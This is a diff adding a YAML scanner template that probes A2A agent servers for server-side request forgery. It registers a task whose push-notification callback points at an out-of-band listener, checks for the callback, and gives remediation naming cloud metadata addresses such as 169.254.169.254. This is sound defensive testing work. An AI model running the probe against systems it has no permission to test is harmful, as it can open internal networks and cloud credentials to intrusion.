@@ -1,0 +1,69 @@
+id: a2a-push-ssrf-001
+info:
+  name: A2A Push Notification SSRF
+  author: batesian
+  severity: high
+  description: |
+    Tests whether an A2A server makes outbound HTTP requests to attacker-controlled
+    URLs registered as push notification callbacks. A vulnerable server will call back
+    to the registered URL upon task completion, enabling SSRF into internal networks,
+    cloud metadata services (AWS IMDS, GCP metadata), or private endpoints.
+
+    This is a confirmed unfixed issue in the reference a2a-python SDK as of April 2026.
+    Any deployment built on the official SDK or following the official A2A tutorial is
+    likely affected.
+
+  references:
+    - https://github.com/google-a2a/a2a-python/issues/786
+    - https://a2aprotocol.ai/docs/specification#push-notifications
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://cwe.mitre.org/data/definitions/918.html
+
+  tags:
+    - a2a
+    - ssrf
+    - push-notification
+    - oob
+    - owasp-agentic-top10
+    - cwe-918
+
+attack:
+  protocol: a2a
+  type: push-notification-ssrf
+
+  register:
+    endpoint: "{{BaseURL}}/tasks/send"
+    method: POST
+    headers:
+      Content-Type: application/json
+    body:
+      id: "batesian-ssrf-probe-{{RandID}}"
+      message:
+        role: user
+        parts:
+          - type: text
+            text: "ping"
+      pushNotificationConfig:
+        url: "{{OOBListener}}"
+        token: "batesian-{{RandID}}"
+
+  oob:
+    listener: "{{OOBListener}}"
+    timeout: 10s
+
+assert:
+  - condition: oob_callback_received
+    description: "Server made an outbound HTTP request to the attacker-controlled callback URL"
+    evidence: "{{OOBCallbackRequest}}"
+    severity: high
+
+  - condition: oob_token_echoed
+    description: "Callback included the push notification token, confirming server-initiated request"
+    severity: high
+
+remediation: |
+  Validate pushNotificationConfig.url against an allowlist of permitted callback
+  domains before registering the task. Reject private IP ranges (RFC 1918), loopback
+  addresses, link-local ranges, and cloud metadata service IPs (169.254.169.254,
+  fd00:ec2::254, etc.). Require HTTPS and verify the callback URL resolves to a
+  public address before accepting task registration.
